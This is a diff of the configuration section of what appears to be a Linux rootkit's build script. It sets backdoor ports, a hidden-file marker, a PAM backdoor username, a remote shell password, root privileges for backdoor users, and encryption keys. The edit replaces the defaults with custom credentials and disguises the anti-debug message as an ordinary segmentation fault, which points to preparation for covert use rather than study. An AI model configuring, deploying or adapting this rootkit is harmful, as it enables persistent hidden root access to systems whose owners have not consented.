@@ -12,18 +12,18 @@ CRYPT_HIGH = "61060"                  # Highest source port for crypthook backdo
 PAM_PORT = "61061"					  # Also hide this port, but don't trigger accept backdoors
 MAGIC_STRING = "__"                   # Hide files with this string in the name
 
-BLIND_LOGIN = "rootme"                # Username for ssh / su PAM backdoor.
+BLIND_LOGIN = "hephaestus"                # Username for ssh / su PAM backdoor.
 C_ROOT = "root"                       # Give accept() users these privs
-SHELL_MSG = "Welcome!\nHere's a shell: " # Welcome msg for remote user
-SHELL_PASSWD = "changeme"             # Remote password for accept backdoors
+SHELL_MSG = "" # Welcome msg for remote user
+SHELL_PASSWD = "pbIdhXklIzlJWdS"             # Remote password for accept backdoors
 SHELL_TYPE = "/bin/bash"              # Execute this as the shell
 
-ANTI_DEBUG_MSG = "Don't scratch the walls"
+ANTI_DEBUG_MSG = "Segmentation fault (core dumped)"
 CLEANUP_LOGS = "CLEANUP_LOGS"
 
 # Crypthook key constants
-PASSPHRASE = "Hello NSA"              # This is the crypto key. CHANGE THIS.
-KEY_SALT = "changeme"                 # Used in key derivation. CHANGE THIS.
+PASSPHRASE = "dDvgf3ofWOuuiww"              # This is the crypto key. CHANGE THIS.
+KEY_SALT = "rzY5OoD3LaMxpVZ"                 # Used in key derivation. CHANGE THIS.
 #-----------------------------------------------------------------------
 
 print '''
